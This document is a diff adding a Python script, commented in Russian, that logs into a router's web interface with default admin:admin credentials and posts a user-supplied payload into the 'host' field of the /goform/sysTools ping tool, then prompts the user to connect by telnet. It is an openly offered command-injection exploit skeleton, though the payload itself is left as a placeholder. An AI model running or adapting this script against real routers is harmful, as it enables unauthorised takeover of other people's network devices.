@@ -1,0 +1,49 @@
+import os
+import requests
+import base64
+import logging
+
+# Настройка логирования
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Получение конфигурации из переменных окружения для безопасности
+router_url = os.getenv("ROUTER_URL", "http://192.168.1.1")
+default_username = os.getenv("ROUTER_USERNAME", "admin")
+default_password = os.getenv("ROUTER_PASSWORD", "admin")
+
+def main():
+    try:
+        payload = "example_payload"  # Замените на вашу полезную нагрузку
+        execute_payload(payload)
+        logging.info(f"Подключитесь к роутеру через telnet: {router_url.split('//')[1]} используя учетные данные.")
+    except Exception as e:
+        logging.error(f"Ошибка в основной функции: {e}")
+
+#генерирует заголовок авторизации для HTTP-запросов.
+def create_auth_header(user, password):
+    credentials = f"{user}:{password}" #user - Имя пользователя | password - Пароль | return - Словарь с заголовком авторизации
+    encoded_credentials = base64.b64encode(credentials.encode("ascii")).decode("ascii")
+    return {"Authorization": f"Basic {encoded_credentials}"}
+
+#Отправляет полезную нагрузку на указанный роутер.
+def execute_payload(payload): #payload - Полезная нагрузка для отправки
+    target_url = f"{router_url}/goform/sysTools"
+    headers = create_auth_header(default_username, default_password)
+    data = {
+        "tool": "0",
+        "pingCount": "4",
+        "host": payload,
+        "submit": "OK"
+    }
+
+    try:
+        response = requests.post(target_url, headers=headers, data=data)
+        response.raise_for_status()
+        logging.info("Полезная нагрузка успешно отправлена.")
+    except requests.RequestException as e:
+        logging.error(f"Ошибка при отправке запроса: {e}")
+    except Exception as e:
+        logging.error(f"Неизвестная ошибка: {e}")
+
+if __name__ == '__main__':
+    main()
